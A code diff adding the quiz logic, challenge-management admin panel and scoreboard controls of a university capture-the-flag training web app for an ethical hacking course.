+          <p style="color:var(--muted);font-size:.85rem;margin:0;flex:1">${esc(quiz.description)}</p>
+          <div style="color:var(--muted);font-size:.8rem">${quiz.questions.length} questions</div>
+          <button class="${res?'btn-fill btn-fill-muted':'btn-fill'}" onclick="startQuiz(${quiz.id})">${res?'RETAKE QUIZ':'START QUIZ'}</button>
+        </div>`;
+      }).join('')}
+    </div>
+  </div>`;
+}
+function startQuiz(id) {
+  STATE.activeQuiz = INITIAL_QUIZZES.find(q=>q.id===id);
+  STATE.quizIdx = 0;
+  STATE.quizAnswers = {};
+  STATE.quizSubmitted = false;
+  renderQuizzes();
+}
+function selectQuizAnswer(i) {
+  STATE.quizAnswers[STATE.quizIdx] = i;
+  renderQuizzes();
+}
+function quizNav(dir) {
+  STATE.quizIdx += dir;
+  renderQuizzes();
+}
+function submitQuiz() {
+  const {activeQuiz, quizAnswers} = STATE;
+  const score = activeQuiz.questions.filter((q,i)=>quizAnswers[i]===q.correct).length;
+  saveQuizResult(activeQuiz.id, score, activeQuiz.questions.length);
+  STATE.quizSubmitted = true;
+  renderQuizzes();
+}
+
+// ============================================================
+// ADMIN
+// ============================================================
+function renderAdmin() {
+  const el = document.getElementById('page-admin');
+  const {challenges, users, adminTab} = STATE;
+  const stats = {total:challenges.length, enabled:challenges.filter(c=>c.enabled).length, users:users.length, solves:users.reduce((a,u)=>a+(u.solves?.length||0),0)};
+  const statCards = [["Challenges",stats.total,G.accent],["Enabled",stats.enabled,G.green],["Users",stats.users,G.yellow],["Total Solves",stats.solves,G.accent2]]
+    .map(([l,v,c])=>`<div class="card stat-card"><div class="stat-val" style="color:${c}">${v}</div><div style="color:var(--muted);font-size:.8rem">${l}</div></div>`).join('');
+
+  let tabContent = '';
+  if (adminTab==='challenges') {
+    tabContent = `<div style="display:flex;justify-content:flex-end;margin-bottom:1rem">
+      <button class="btn-fill btn-fill-green" onclick="openAdminEdit(null)">+ ADD CHALLENGE</button>
+    </div>
+    <div>
+      ${challenges.map(ch=>`<div class="card ch-row">
+        <div class="ch-row-title">${esc(ch.title)} ${badge(ch.category,G.accent2)}</div>
+        ${badge(ch.difficulty,diffColor[ch.difficulty])}
+        ${badge(ch.points+'pts',G.yellow)}
+        ${badge(ch.enabled?'ENABLED':'DISABLED',ch.enabled?G.green:G.muted)}
+        <div class="flex-row">
+          <button class="btn" onclick="openAdminEdit(${ch.id})">EDIT</button>
+          <button class="btn ${ch.enabled?'btn-muted':'btn-green'}" onclick="adminToggle(${ch.id})">${ch.enabled?'DISABLE':'ENABLE'}</button>
+          <button class="btn btn-red" onclick="adminDelete(${ch.id})">DEL</button>
+        </div>
+      </div>`).join('')}
+    </div>`;
+  } else if (adminTab==='users') {
+    tabContent = `<div class="card">
+      <table class="admin-table">
+        <thead><tr>${["ID","Username","Role","Points","Solves"].map(h=>`<th>${h}</th>`).join('')}</tr></thead>
+        <tbody>
+          ${users.map(u=>`<tr>
+            <td style="color:var(--muted)">${u.id}</td>
+            <td>${esc(u.username)}</td>
+            <td>${badge(u.role,u.role==='admin'?G.red:G.accent)}</td>
+            <td style="color:var(--accent);font-weight:bold">${u.points||0}</td>
+            <td style="color:var(--muted)">${u.solves?.length||0}</td>
+          </tr>`).join('')}
+        </tbody>
+      </table>
+    </div>`;
+  } else {
+    tabContent = `<div style="max-width:500px">
+      <div class="card mb1">
+        <h3 style="color:var(--yellow);margin-top:0">🔄 Reset Scoreboard</h3>
+        <p style="color:var(--muted);font-size:.9rem;margin-bottom:1rem">Clears all points and solves for all users. Use at the start of a new semester.</p>
+        ${!STATE.confirmReset
+          ?`<button class="btn btn-red" onclick="STATE.confirmReset=true;renderAdmin()">RESET SCOREBOARD</button>`
+          :`<div class="flex-row">
+            <button class="btn-fill btn-fill-red" onclick="doResetScoreboard()">CONFIRM RESET</button>
+            <button class="btn" onclick="STATE.confirmReset=false;renderAdmin()">CANCEL</button>
+          </div>`}
+      </div>
+      <div class="card">
+        <h3 style="color:var(--accent);margin-top:0">📊 Platform Info</h3>
+        <div style="display:grid;gap:.5rem;font-size:.9rem;color:var(--muted)">
+          <div>Platform: UTech CTF Hub v1.0</div>
+          <div>Course: CNS3005 Ethical Hacking</div>
+          <div>University: University of Technology, Jamaica</div>
+        </div>
+      </div>
+    </div>`;
+  }
+
+  el.innerHTML = `<div class="page">
+    <h1 style="color:var(--red);letter-spacing:3px;margin-bottom:.5rem">⚙️ ADMIN PANEL</h1>
+    <div class="stats-grid">${statCards}</div>
+    <div class="flex-row mb15">
+      ${["challenges","users","settings"].map(t=>`<button class="${adminTab===t?'btn-fill':'btn'}" onclick="adminTab('${t}')">${t.toUpperCase()}</button>`).join('')}
+    </div>
+    ${tabContent}
+  </div>`;
+
+  if (STATE.editingChallenge !== null) renderAdminEditModal();
+}
+function adminTab(t) { STATE.adminTab=t; STATE.confirmReset=false; renderAdmin(); }
+function adminToggle(id) { STATE.challenges=STATE.challenges.map(c=>c.id===id?{...c,enabled:!c.enabled}:c); renderAdmin(); }
+function adminDelete(id) { STATE.challenges=STATE.challenges.filter(c=>c.id!==id); renderAdmin(); }
+function doResetScoreboard() { resetScoreboard(); STATE.confirmReset=false; renderAdmin(); }
+
+function openAdminEdit(id) {
+  if (id===null) {
+    STATE.editingChallenge = 'new';
+    STATE.editForm = {title:"",category:"Web Hacking",difficulty:"Beginner",points:100,description:"",flag:"flag{}",hint:"",explanation:"",enabled:true};
+  } else {
+    const ch = STATE.challenges.find(c=>c.id===id);
+    STATE.editingChallenge = id;
+    STATE.editForm = {...ch};
+  }
+  renderAdmin();
+}
+function renderAdminEditModal() {
+  const f = STATE.editForm;
+  const isNew = STATE.editingChallenge === 'new';
+  document.getElementById('modal-inner').innerHTML = `
+    <h3 style="color:var(--accent);margin-top:0">${isNew?'ADD CHALLENGE':'EDIT CHALLENGE'}</h3>
+    ${[['title','Title'],['description','Description'],['flag','Flag'],['hint','Hint'],['explanation','Explanation'],['points','Points (number)']].map(([k,l])=>`
+      <div class="mb08">
+        <label style="color:var(--muted);font-size:.8rem;display:block;margin-bottom:.3rem">${l}</label>
+        ${k==='description'||k==='explanation'
+          ?`<textarea class="inp" style="height:80px" oninput="STATE.editForm['${k}']=this.value">${esc(f[k]||'')}</textarea>`
+          :`<input class="inp" type="${k==='points'?'number':'text'}" value="${esc(String(f[k]||''))}" oninput="STATE.editForm['${k}']=${k==='points'?'Number(this.value)':'this.value'}" />`}
+      </div>`).join('')}
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:.8rem;margin-bottom:1rem">
+      <div>
+        <label style="color:var(--muted);font-size:.8rem;display:block;margin-bottom:.3rem">Category</label>
+        <select class="inp" onchange="STATE.editForm.category=this.value">
+          ${Object.keys(catEmoji).map(c=>`<option${f.category===c?' selected':''}>${c}</option>`).join('')}
+        </select>
+      </div>
+      <div>
+        <label style="color:var(--muted);font-size:.8rem;display:block;margin-bottom:.3rem">Difficulty</label>
+        <select class="inp" onchange="STATE.editForm.difficulty=this.value">
+          ${["Beginner","Intermediate","Advanced"].map(d=>`<option${f.difficulty===d?' selected':''}>${d}</option>`).join('')}
+        </select>
+      </div>
+    </div>
+    <div class="flex-row">
+      <button class="btn-fill btn-fill-green" onclick="saveAdminChallenge()">SAVE</button>
+      <button class="btn" onclick="STATE.editingChallenge=null;document.getElementById('modal').classList.add('hidden');renderAdmin()">CANCEL</button>
+    </div>`;
+  document.getElementById('modal').classList.remove('hidden');
+}
+function saveAdminChallenge() {
+  const f = STATE.editForm;
+  if (STATE.editingChallenge==='new') {
+    STATE.challenges.push({...f, id:Date.now()});
+  } else {
+    STATE.challenges = STATE.challenges.map(c=>c.id===STATE.editingChallenge?{...f,id:STATE.editingChallenge}:c);
+  }
+  STATE.editingChallenge = null;
+  document.getElementById('modal').classList.add('hidden');
+  renderAdmin();
+}
+
+// ============================================================
+// BOOT
+// ============================================================
+render();
+</script>
+</body>
+</html>
